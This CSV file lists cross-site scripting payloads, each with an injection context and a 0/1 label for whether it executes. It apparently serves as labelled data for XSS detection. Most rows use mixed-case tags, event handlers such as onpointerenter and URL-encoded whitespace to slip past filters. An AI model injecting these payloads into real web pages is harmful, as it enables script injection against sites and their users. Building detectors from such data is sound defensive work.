payload,context,exec,combined
<DeTAILs/+/ONTOggLe%09=%09confirm()%0dx//,html_text,1,CTX_html_text CTX_html_text CTX_html_text <DeTAILs/+/ONTOggLe%09=%09confirm()%0dx//
<DeTAIls%0doNToGglE%0a=%0aconfirm()%0dx//,html_text,0,CTX_html_text CTX_html_text CTX_html_text <DeTAIls%0doNToGglE%0a=%0aconfirm()%0dx//
<A%0dONmOUseOvEr%0d=%0dconfirm()>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <A%0dONmOUseOvEr%0d=%0dconfirm()>v3dm0s
<d3V%09onmOUsEOVER%09=%09(prompt)``>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <d3V%09onmOUsEOVER%09=%09(prompt)``>v3dm0s
<HTml%09onMouseOver+=+(prompt)``%0dx//,html_text,0,CTX_html_text CTX_html_text CTX_html_text <HTml%09onMouseOver+=+(prompt)``%0dx//
<a%09oNpoiNteRenTER%0a=%0a[8].find(confirm)%0dx>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <a%09oNpoiNteRenTER%0a=%0a[8].find(confirm)%0dx>v3dm0s
<a%0dONmOuseOVer%09=%09(confirm)()%0dx>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <a%0dONmOuseOVer%09=%09(confirm)()%0dx>v3dm0s
"<a%0doNMOuseOVEr%0a=%0aa=prompt,a()>v3dm0s",html_tag,1,"CTX_html_tag CTX_html_tag CTX_html_tag <a%0doNMOuseOVEr%0a=%0aa=prompt,a()>v3dm0s"
<D3v%09onmoUseOVER%0d=%0d(confirm)()>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <D3v%09onmoUseOVER%0d=%0d(confirm)()>v3dm0s
<d3V/+/oNmoUseoVer%0a=%0a(confirm)()>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <d3V/+/oNmoUseoVer%0a=%0a(confirm)()>v3dm0s
<d3v%09oNpoiNTerEnTeR%09=%09confirm()>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <d3v%09oNpoiNTerEnTeR%09=%09confirm()>v3dm0s
<hTMl%0dONPoInTerEnteR%0d=%0d(confirm)()>,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <hTMl%0dONPoInTerEnteR%0d=%0d(confirm)()>
<D3v%09OnPointeReNteR%0d=%0d(prompt)``%0dx>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <D3v%09OnPointeReNteR%0d=%0d(prompt)``%0dx>v3dm0s
<d3v/+/ONpoINtErenTer%09=%09(confirm)()>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <d3v/+/ONpoINtErenTer%09=%09(confirm)()>v3dm0s
"<A%0aOnpoINTErEnTER+=+a=prompt,a()%0dx>v3dm0s",html_tag,0,"CTX_html_tag CTX_html_tag CTX_html_tag <A%0aOnpoINTErEnTER+=+a=prompt,a()%0dx>v3dm0s"
<a%09ONmoUsEoVeR%0a=%0a[8].find(confirm)>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <a%09ONmoUsEoVeR%0a=%0a[8].find(confirm)>v3dm0s
<randomtag>,html_text,0,CTX_html_text CTX_html_text CTX_html_text <randomtag>
"<DetAILs%0aONToggle%0d=%0da=prompt,a()//",html_tag,0,"CTX_html_tag CTX_html_tag CTX_html_tag <DetAILs%0aONToggle%0d=%0da=prompt,a()//"
"<detAIlS%09ONpOIntEREnTER%09=%09a=prompt,a()>",html_tag,0,"CTX_html_tag CTX_html_tag CTX_html_tag <detAIlS%09ONpOIntEREnTER%09=%09a=prompt,a()>"
<DEtailS%09ontOgGlE%09=%09(prompt)``%0dx//,html_text,0,CTX_html_text CTX_html_text CTX_html_text <DEtailS%09ontOgGlE%09=%09(prompt)``%0dx//
<HtML%09OnmouseOVER%0a=%0aconfirm()%0dx>,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <HtML%09OnmouseOVER%0a=%0aconfirm()%0dx>
<A%0donPOINTerENTEr%0d=%0dconfirm()>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <A%0donPOINTerENTEr%0d=%0dconfirm()>v3dm0s
<HtmL/+/ONPoiNtEreNtER%0a=%0a(prompt)``%0dx>,html_text,0,CTX_html_text CTX_html_text CTX_html_text <HtmL/+/ONPoiNtEreNtER%0a=%0a(prompt)``%0dx>
"<D3v%09ONpOiNTeREntER%09=%09a=prompt,a()>v3dm0s",html_text,1,"CTX_html_text CTX_html_text CTX_html_text <D3v%09ONpOiNTeREntER%09=%09a=prompt,a()>v3dm0s"
<HTMl%0donmousEoVER%0a=%0aconfirm()%0dx//,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <HTMl%0donmousEoVER%0a=%0aconfirm()%0dx//
<a%0aonpoInTerEntER%0a=%0a(prompt)``%0dx>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <a%0aonpoInTerEntER%0a=%0a(prompt)``%0dx>v3dm0s
<D3v%09onPoinTeRENteR%0a=%0a(confirm)()%0dx>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <D3v%09onPoinTeRENteR%0a=%0a(confirm)()%0dx>v3dm0s
<dETaILs%0dOnpoINtERENtEr%0d=%0d[8].find(confirm)>,html_text,0,CTX_html_text CTX_html_text CTX_html_text <dETaILs%0dOnpoINtERENtEr%0d=%0d[8].find(confirm)>
"<deTailS/+/OntOGGlE+=+a=prompt,a()>",html_tag,0,"CTX_html_tag CTX_html_tag CTX_html_tag <deTailS/+/OntOGGlE+=+a=prompt,a()>"
"<dEtAils%09onPoINtEREnTer%0d=%0da=prompt,a()//",html_text,0,"CTX_html_text CTX_html_text CTX_html_text <dEtAils%09onPoINtEREnTer%0d=%0da=prompt,a()//"
"""><svg/onload=alert(1)>",html_tag,1,"CTX_html_tag CTX_html_tag CTX_html_tag ""><svg/onload=alert(1)>"
<dETAilS%09ONPoiNTERENTer%0a=%0a(confirm)()//,html_text,0,CTX_html_text CTX_html_text CTX_html_text <dETAilS%09ONPoiNTERENTer%0a=%0a(confirm)()//
<D3v%0aOnPoinTerentER%09=%09(prompt)``%0dx>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <D3v%0aOnPoinTerentER%09=%09(prompt)``%0dx>v3dm0s
"<A%09OnmOUSEOver%0d=%0da=prompt,a()>v3dm0s",html_text,1,"CTX_html_text CTX_html_text CTX_html_text <A%09OnmOUSEOver%0d=%0da=prompt,a()>v3dm0s"
alert,html_text,0,CTX_html_text CTX_html_text CTX_html_text alert
"<d3V%0doNPOInTerEnter%0a=%0aa=prompt,a()%0dx>v3dm0s",html_tag,1,"CTX_html_tag CTX_html_tag CTX_html_tag <d3V%0doNPOInTerEnter%0a=%0aa=prompt,a()%0dx>v3dm0s"
""";alert(window.origin);//",html_tag,0,"CTX_html_tag CTX_html_tag CTX_html_tag "";alert(window.origin);//"
<d3V/+/oNmouSeoVER%09=%09(prompt)``>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <d3V/+/oNmouSeoVER%09=%09(prompt)``>v3dm0s
<D3V/+/OnmoUSeoVeR%0a=%0aconfirm()%0dx>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <D3V/+/OnmoUSeoVeR%0a=%0aconfirm()%0dx>v3dm0s
<deTailS%0dONpoINTeReNteR%09=%09confirm()>,html_text,0,CTX_html_text CTX_html_text CTX_html_text <deTailS%0dONpoINTeReNteR%09=%09confirm()>
<A%0aoNmouseoVeR%0a=%0a(prompt)``%0dx>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <A%0aoNmouseoVeR%0a=%0a(prompt)``%0dx>v3dm0s
<a%0aonPOintEreNtER%0d=%0dconfirm()%0dx>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <a%0aonPOintEreNtER%0d=%0dconfirm()%0dx>v3dm0s
<A%0aONmOUSEOvEr%0d=%0d(prompt)``>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <A%0aONmOUSEOvEr%0d=%0d(prompt)``>v3dm0s
<A/+/oNpoINTErEnTeR%09=%09(prompt)``>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <A/+/oNpoINTErEnTeR%09=%09(prompt)``>v3dm0s
<d3V%0aonpoINtEREntEr%09=%09confirm()%0dx>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <d3V%0aonpoINtEREntEr%09=%09confirm()%0dx>v3dm0s
<deTAIls%0aONtOggLe%0a=%0a[8].find(confirm)//,html_text,0,CTX_html_text CTX_html_text CTX_html_text <deTAIls%0aONtOggLe%0a=%0a[8].find(confirm)//
"<HtML%0aOnmoUSeoVer%0a=%0aa=prompt,a()>",html_text,0,"CTX_html_text CTX_html_text CTX_html_text <HtML%0aOnmoUSeoVer%0a=%0aa=prompt,a()>"
<DETAiLS%0aOntOggLe+=+(prompt)``%0dx//,html_text,0,CTX_html_text CTX_html_text CTX_html_text <DETAiLS%0aOntOggLe+=+(prompt)``%0dx//
<A/+/onmOUseOVEr+=+(prompt)``%0dx>v3dm0s,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <A/+/onmOUseOVEr+=+(prompt)``%0dx>v3dm0s
<DetAils%0aONToGGlE%0a=%0a(prompt)``%0dx>,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <DetAils%0aONToGGlE%0a=%0a(prompt)``%0dx>
<dETAIlS%0aonpOInTereNTer%0a=%0a(confirm)()>,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <dETAIlS%0aonpOInTereNTer%0a=%0a(confirm)()>
<A%0aOnmoUseoVeR%0d=%0d(confirm)()%0dx>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <A%0aOnmoUseoVeR%0d=%0d(confirm)()%0dx>v3dm0s
<A%0dOnpOinTErEnTer%0a=%0a(confirm)()%0dx>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <A%0dOnpOinTErEnTer%0a=%0a(confirm)()%0dx>v3dm0s
<DeTAilS%0aOntogGlE%09=%09(confirm)()>,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <DeTAilS%0aOntogGlE%09=%09(confirm)()>
<HTmL%0aONmOuSeOVer%0d=%0d(prompt)``>,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <HTmL%0aONmOuSeOVer%0d=%0d(prompt)``>
<Html/+/onPoiNTEReNTEr+=+confirm()//,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <Html/+/onPoiNTEReNTEr+=+confirm()//
<detailS%09OnpoINterEnTEr+=+(confirm)()%0dx//,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <detailS%09OnpoINterEnTEr+=+(confirm)()%0dx//
<d3V%0dOnmouseovEr%0d=%0dconfirm()%0dx>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <d3V%0dOnmouseovEr%0d=%0dconfirm()%0dx>v3dm0s
<a%09OnmoUsEoVEr%09=%09(prompt)``%0dx>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <a%09OnmoUsEoVEr%09=%09(prompt)``%0dx>v3dm0s
<D3V%0aonPointeReNTEr%09=%09confirm()>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <D3V%0aonPointeReNTEr%09=%09confirm()>v3dm0s
<Html%09oNmoUSeOver%0d=%0d(prompt)``%0dx//,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <Html%09oNmoUSeOver%0d=%0d(prompt)``%0dx//
<a%09oNmoUSEOvER%0a=%0a(prompt)``%0dx>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <a%09oNmoUSEOvER%0a=%0a(prompt)``%0dx>v3dm0s
<A%0aONMouseOVEr+=+confirm()>v3dm0s,html_text,0,CTX_html_text CTX_html_text CTX_html_text <A%0aONMouseOVEr+=+confirm()>v3dm0s
<HTMl/+/ONMousEOVeR%09=%09(confirm)()>,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <HTMl/+/ONMousEOVeR%09=%09(confirm)()>
<body>,html_text,0,CTX_html_text CTX_html_text CTX_html_text <body>
<script>alert(document.domain)</script>,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <script>alert(document.domain)</script>
<dEtAIlS%0aonTOgGLE%09=%09confirm()//,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <dEtAIlS%0aonTOgGLE%09=%09confirm()//
<DETAiLS%0dOnPointerenTER%0d=%0d[8].find(confirm)//,html_text,0,CTX_html_text CTX_html_text CTX_html_text <DETAiLS%0dOnPointerenTER%0d=%0d[8].find(confirm)//
<D3v/+/ONpoInteRenteR+=+confirm()>v3dm0s,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <D3v/+/ONpoInteRenteR+=+confirm()>v3dm0s
<d3V%0dONpoiNteRENTeR%09=%09(prompt)``%0dx>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <d3V%0dONpoiNteRENTeR%09=%09(prompt)``%0dx>v3dm0s
<A%0aoNMousEover%0d=%0dconfirm()%0dx>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <A%0aoNMousEover%0d=%0dconfirm()%0dx>v3dm0s
<d3V%0doNMousEovER%09=%09confirm()>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <d3V%0doNMousEovER%09=%09confirm()>v3dm0s
<D3v/+/ONpoiNTErENTeR%09=%09(confirm)()>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <D3v/+/ONpoiNTErENTeR%09=%09(confirm)()>v3dm0s
<A%0dOnMOusEoVer%09=%09(confirm)()>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <A%0dOnMOusEoVer%09=%09(confirm)()>v3dm0s
<D3v/+/onMoUseOvER%0d=%0dconfirm()>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <D3v/+/onMoUseOvER%0d=%0dconfirm()>v3dm0s
<d3V%09OnpOiNTeRenTER%0a=%0a(prompt)``%0dx>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <d3V%09OnpOiNTeRenTER%0a=%0a(prompt)``%0dx>v3dm0s
<a/+/ONpOINtERENtER%0d=%0d(confirm)()>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <a/+/ONpOINtERENtER%0d=%0d(confirm)()>v3dm0s
<A%0doNPOiNTEREnTER+=+(prompt)``>v3dm0s,html_text,0,CTX_html_text CTX_html_text CTX_html_text <A%0doNPOiNTEREnTER+=+(prompt)``>v3dm0s
"<a%0aONPoiNTERenTEr%09=%09a=prompt,a()%0dx>v3dm0s",html_text,1,"CTX_html_text CTX_html_text CTX_html_text <a%0aONPoiNTERenTEr%09=%09a=prompt,a()%0dx>v3dm0s"
"<a/+/onpoiNTERENTER%0a=%0aa=prompt,a()%0dx>v3dm0s",html_text,1,"CTX_html_text CTX_html_text CTX_html_text <a/+/onpoiNTERENTER%0a=%0aa=prompt,a()%0dx>v3dm0s"
"<d3v%0aoNmOuSeover%0a=%0aa=prompt,a()>v3dm0s",html_tag,1,"CTX_html_tag CTX_html_tag CTX_html_tag <d3v%0aoNmOuSeover%0a=%0aa=prompt,a()>v3dm0s"
"<A/+/ONPOiNTErEnTER%09=%09a=prompt,a()%0dx>v3dm0s",html_tag,1,"CTX_html_tag CTX_html_tag CTX_html_tag <A/+/ONPOiNTErEnTER%09=%09a=prompt,a()%0dx>v3dm0s"
<HtML%0dOnMouSEoVER%09=%09[8].find(confirm)>,html_text,0,CTX_html_text CTX_html_text CTX_html_text <HtML%0dOnMouSEoVER%09=%09[8].find(confirm)>
<a%0doNmoUSeoVEr%0d=%0d(prompt)``%0dx>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <a%0doNmoUSeoVEr%0d=%0d(prompt)``%0dx>v3dm0s
<HtML%0donmoUseoVER+=+(prompt)``//,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <HtML%0donmoUseoVER+=+(prompt)``//
<deTaiLS/+/OnpOINtEreNteR%09=%09(prompt)``>,html_text,0,CTX_html_text CTX_html_text CTX_html_text <deTaiLS/+/OnpOINtEreNteR%09=%09(prompt)``>
<html/+/OnPOiNTErENtEr%0d=%0dconfirm()//,script_block,0,CTX_script_block CTX_script_block CTX_script_block <html/+/OnPOiNTErENtEr%0d=%0dconfirm()//
<deTAilS%0dOnPoINTErEnTer%0a=%0a(prompt)``//,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <deTAilS%0dOnPoINTErEnTer%0a=%0a(prompt)``//
"<A%09ONpOInTeRenteR%09=%09a=prompt,a()%0dx>v3dm0s",html_text,1,"CTX_html_text CTX_html_text CTX_html_text <A%09ONpOInTeRenteR%09=%09a=prompt,a()%0dx>v3dm0s"
<detAIlS%0dONtoGGLe%0a=%0a(confirm)()//,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <detAIlS%0dONtoGGLe%0a=%0a(confirm)()//
<a/+/oNPoINtERENteR%09=%09[8].find(confirm)>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <a/+/oNPoINtERENteR%09=%09[8].find(confirm)>v3dm0s
<a/+/OnpoinTerENTeR%0d=%0dconfirm()>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <a/+/OnpoinTerENTeR%0d=%0dconfirm()>v3dm0s
<a%09OnMouseOveR%09=%09[8].find(confirm)>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <a%09OnMouseOveR%09=%09[8].find(confirm)>v3dm0s
<A/+/oNMOUSEOVer%09=%09[8].find(confirm)>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <A/+/oNMOUSEOVer%09=%09[8].find(confirm)>v3dm0s
"<D3v%0aONPOinteRenTer%0d=%0da=prompt,a()>v3dm0s",html_text,1,"CTX_html_text CTX_html_text CTX_html_text <D3v%0aONPOinteRenTer%0d=%0da=prompt,a()>v3dm0s"
<D3v%09oNMOusEoVeR%0a=%0a[8].find(confirm)>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <D3v%09oNMOusEoVeR%0a=%0a[8].find(confirm)>v3dm0s
<A%09oNMOUsEOvER%09=%09[8].find(confirm)>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <A%09oNMOUsEOvER%09=%09[8].find(confirm)>v3dm0s
<hTMl/+/ONMOUSEOver+=+(prompt)``//,script_block,0,CTX_script_block CTX_script_block CTX_script_block <hTMl/+/ONMOUSEOver+=+(prompt)``//
test input,html_text,0,CTX_html_text CTX_html_text CTX_html_text test input
<detAILS%09OntOGGLe%0d=%0dconfirm()>,script_block,0,CTX_script_block CTX_script_block CTX_script_block <detAILS%09OntOGGLe%0d=%0dconfirm()>
<hTml%09onPoInteReNTer%0d=%0d(prompt)``%0dx//,html_text,0,CTX_html_text CTX_html_text CTX_html_text <hTml%09onPoInteReNTer%0d=%0d(prompt)``%0dx//
<HTML%0aOnMoUSEOvEr%0d=%0dconfirm()%0dx//,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <HTML%0aOnMoUSEOvEr%0d=%0dconfirm()%0dx//
<a%0aonpOIntereNTer%09=%09confirm()%0dx>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <a%0aonpOIntereNTer%09=%09confirm()%0dx>v3dm0s
<D3V%0aOnMoUSeOvEr%0d=%0dconfirm()>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <D3V%0aOnMoUSeOvEr%0d=%0dconfirm()>v3dm0s
<d3v%0aOnMOUSeOver%0a=%0a(prompt)``%0dx>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <d3v%0aOnMOUSeOver%0a=%0a(prompt)``%0dx>v3dm0s
<detAIlS%09oNpointErEnTER+=+[8].find(confirm)%0dx>,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <detAIlS%09oNpointErEnTER+=+[8].find(confirm)%0dx>
"<hTML%09OnpoinTerENTER+=+a=prompt,a()>",html_text,0,"CTX_html_text CTX_html_text CTX_html_text <hTML%09OnpoinTerENTER+=+a=prompt,a()>"
onload=run,html_text,0,CTX_html_text CTX_html_text CTX_html_text onload=run
"<HTML%0aoNpoINTEreNteR%09=%09a=prompt,a()>",html_text,0,"CTX_html_text CTX_html_text CTX_html_text <HTML%0aoNpoINTEreNteR%09=%09a=prompt,a()>"
<A/+/ONpOInTeRENtEr+=+(confirm)()>v3dm0s,html_text,0,CTX_html_text CTX_html_text CTX_html_text <A/+/ONpOInTeRENtEr+=+(confirm)()>v3dm0s
<A%0donpoiNTErENtEr%0d=%0d[8].find(confirm)>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <A%0donpoiNTErENtEr%0d=%0d[8].find(confirm)>v3dm0s
<a%09onpOInTerENTeR%0d=%0d(prompt)``>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <a%09onpOInTerENTeR%0d=%0d(prompt)``>v3dm0s
<D3V%0aonPointeReNTEr%09=%09confirm()>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <D3V%0aonPointeReNTEr%09=%09confirm()>v3dm0s
javascript:alert(1),url_navigation,1,CTX_url_navigation CTX_url_navigation CTX_url_navigation javascript:alert(1)
<img src=x onerror=alert&#x28;1&#x29;>,html_text,0,CTX_html_text CTX_html_text CTX_html_text <img src=x onerror=alert&#x28;1&#x29;>
<d3V/+/OnpOINTERENTER%0a=%0a[8].find(confirm)>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <d3V/+/OnpOINTERENTER%0a=%0a[8].find(confirm)>v3dm0s
<A%0doNPOInTerENter%0d=%0d[8].find(confirm)>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <A%0doNPOInTerENter%0d=%0d[8].find(confirm)>v3dm0s
<a%0dOnpOINTerEnteR%09=%09(prompt)``%0dx>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <a%0dOnpOINTerEnteR%09=%09(prompt)``%0dx>v3dm0s
<a%09oNPOinTeRENTEr%0a=%0aconfirm()>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <a%09oNPOinTeRENTEr%0a=%0aconfirm()>v3dm0s
<A/+/ONPOintErenteR%0d=%0d(prompt)``>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <A/+/ONPOintErenteR%0d=%0d(prompt)``>v3dm0s
<A%0dOnMoUsEoVEr%0d=%0d[8].find(confirm)>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <A%0dOnMoUsEoVEr%0d=%0d[8].find(confirm)>v3dm0s
<HTML/+/oNMoUsEoVEr%0d=%0dconfirm()%0dx//,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <HTML/+/oNMoUsEoVEr%0d=%0dconfirm()%0dx//
<A%0doNpOinTErENTeR%0d=%0d(confirm)()%0dx>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <A%0doNpOinTErENTeR%0d=%0d(confirm)()%0dx>v3dm0s
<D3v/+/ONmoUSEoVer%0a=%0aconfirm()>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <D3v/+/ONmoUSEoVer%0a=%0aconfirm()>v3dm0s
<a%0doNPoiNteReNter+=+(prompt)``%0dx>v3dm0s,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <a%0doNPoiNteReNter+=+(prompt)``%0dx>v3dm0s
<a/+/onMouseoVER%0a=%0aconfirm()>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <a/+/onMouseoVER%0a=%0aconfirm()>v3dm0s
<DETAiLs%0dONToGgLE%09=%09confirm()%0dx>,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <DETAiLs%0dONToGgLE%09=%09confirm()%0dx>
<D3v%0doNmOUSeoveR%0d=%0dconfirm()%0dx>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <D3v%0doNmOUSeoveR%0d=%0dconfirm()%0dx>v3dm0s
<D3v%09OnPointeReNteR%0d=%0d(prompt)``%0dx>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <D3v%09OnPointeReNteR%0d=%0d(prompt)``%0dx>v3dm0s
<DETails%0donPOiNTerEntEr%0a=%0a(confirm)()%0dx>,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <DETails%0donPOiNTerEntEr%0a=%0a(confirm)()%0dx>
<HTMl%0aOnpoINTereNtEr%0d=%0d(prompt)``%0dx//,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <HTMl%0aOnpoINTereNtEr%0d=%0d(prompt)``%0dx//
<D3V/+/ONPoinTerenTEr%09=%09confirm()%0dx>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <D3V/+/ONPoinTerenTEr%09=%09confirm()%0dx>v3dm0s
<A%0dOnPoInTErenTeR%09=%09confirm()>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <A%0dOnPoInTErenTeR%09=%09confirm()>v3dm0s
<A/+/oNpOINtErenter%09=%09(prompt)``%0dx>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <A/+/oNpOINtErenter%09=%09(prompt)``%0dx>v3dm0s
<d3V%0aoNMoUsEOver+=+[8].find(confirm)%0dx>v3dm0s,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <d3V%0aoNMoUsEOver+=+[8].find(confirm)%0dx>v3dm0s
<hTML%0aOnPoiNterENTer%0a=%0a(confirm)()%0dx//,html_tag,0,CTX_html_tag CTX_html_tag CTX_html_tag <hTML%0aOnPoiNterENTer%0a=%0a(confirm)()%0dx//
<A%0aoNmOUseOVEr%0d=%0dconfirm()%0dx>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <A%0aoNmOUseOVEr%0d=%0dconfirm()%0dx>v3dm0s
<d3v%0dONMouSEoVeR%09=%09confirm()%0dx>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <d3v%0dONMouSEoVeR%09=%09confirm()%0dx>v3dm0s
"<d3v/+/ONPoinTErEnTER%09=%09a=prompt,a()%0dx>v3dm0s",html_tag,1,"CTX_html_tag CTX_html_tag CTX_html_tag <d3v/+/ONPoinTErEnTER%09=%09a=prompt,a()%0dx>v3dm0s"
<DeTAilS/+/OntoGGLe%0d=%0dconfirm()%0dx>,html_text,0,CTX_html_text CTX_html_text CTX_html_text <DeTAilS/+/OntoGGLe%0d=%0dconfirm()%0dx>
<D3v%0aoNmOUsEOver%0a=%0aconfirm()%0dx>v3dm0s,html_tag,1,CTX_html_tag CTX_html_tag CTX_html_tag <D3v%0aoNmOUsEOver%0a=%0aconfirm()%0dx>v3dm0s
<d3v%0aONPoiNTeRentEr%0a=%0a[8].find(confirm)>v3dm0s,html_text,1,CTX_html_text CTX_html_text CTX_html_text <d3v%0aONPoiNTeRentEr%0a=%0a[8].find(confirm)>v3dm0s
"<a%0aOnpOINteRENter%09=%09a=prompt,a()>v3dm0s",html_text,1,"CTX_html_text CTX_html_text CTX_html_text <a%0aOnpOINteRENter%09=%09a=prompt,a()>v3dm0s"
